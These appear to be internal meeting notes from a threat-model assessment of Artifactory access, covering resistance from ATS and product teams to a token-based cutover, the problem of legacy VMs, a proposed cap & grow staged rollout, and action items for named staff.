- **Proposed Approach**: The proposition is to adopt a cap & grow strategy with a staggered/staged deployment. This includes educating users on the impact, communicating the desired positive impact, understanding the effort required, providing technical support, and allocating resources to enable the transition.
- **FY Goal**: This initiative should be pitched as a fiscal year goal, requiring a formal proposal.
- **ATS Stance**: ATS is currently saying no to moving forward, speaking on behalf of the product teams that will be impacted. They cite impacts on ethos, digital governance, and other areas.

### Action Items

- Check with Pawan about the CA (Concept/Accept) program.
- Jon Macham will have a conversation with Kevin Patterson, Virshal (Kevin's manager), and Sashan Gard.




---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Meetings/Artifactory Access - Meeting 03-06-2025.md
---

- Dev teams know there will be impact but they dont know the depths and breath of the impact
- For new provisioning they can deploy with tokens built into them
	- But older VMs that have been around for 10 years can't cut over as easily
- There are technical solutions to fix the issue, it is a matter of getting resources to perform the task
	- There is also the issue self-managed systems, these systems are managed by individuals and not ATS
- ATS wants to overhaul the software lifecycle of Operating systems
	- Those changes/impact won't be seen until 2027 at the earliest
- ATS has not been able to get their own governance goals in place because of push back from product teams
	- Prod teams are asking for more time
- Adobe is not ready to make this change
	- We need to separate our software builds from OS updates
- Proposition is to do cap & grow, and a staggered/stage deployment
	- We need to educate users on the impact
	- We need to communicate/understand the desired positive impact
	- We need understand what the effort is
		- Provide the technical support that will be required
		- Provide resources that will enable this transition
- We need to pitch this as an FY goal
	- This will require a formal proposal
- ATS is saying no to move forward
	- Speaking of the behalf of the product teams that will be impacted
	- Impact to ethos, digital governance, etc.

# Action Items
- Check with Pawan about CA (Concept/Accept) program
- Jon Macham will have a conversation with Kevin Paternson, Virshal (Kev's manager), Sashan Gard
